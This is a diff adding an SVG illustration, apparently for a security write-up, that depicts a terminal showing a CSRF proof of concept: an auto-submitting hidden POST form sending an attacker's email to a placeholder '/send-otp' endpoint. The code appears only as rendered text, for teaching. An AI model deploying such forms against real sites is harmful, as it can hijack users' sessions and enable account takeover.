@@ -1,0 +1,16 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 720 405" role="img" aria-labelledby="title desc">
+  <title id="title">CSRF form</title>
+  <desc id="desc">A dark terminal showing a form that submits on load to another site.</desc>
+  <rect width="720" height="405" fill="#0f1117"/>
+  <circle cx="30" cy="30" r="6" fill="#dc2626"/><circle cx="52" cy="30" r="6" fill="#475569"/><circle cx="74" cy="30" r="6" fill="#475569"/>
+  <path d="M0 57h720" stroke="#334155"/>
+  <g font-family="ui-monospace, SFMono-Regular, Menlo, monospace" font-size="18">
+    <rect x="28" y="78" width="612" height="36" rx="4" fill="#dc2626" opacity=".16"/>
+    <text x="40" y="102" fill="#ef4444">&lt;body onload="document.forms[0].submit()"&gt;</text>
+    <text x="40" y="162" fill="#94a3b8">  &lt;form method="POST"</text>
+    <text x="40" y="210" fill="#e2e8f0">    action="https://target-vdp-url/send-otp"&gt;</text>
+    <text x="40" y="266" fill="#94a3b8">    &lt;input type="hidden" name="email"</text>
+    <text x="40" y="314" fill="#ef4444">      value="attacker@echoesofwhoami.com"&gt;</text>
+    <text x="40" y="370" fill="#94a3b8">  &lt;/form&gt;</text>
+  </g>
+</svg>
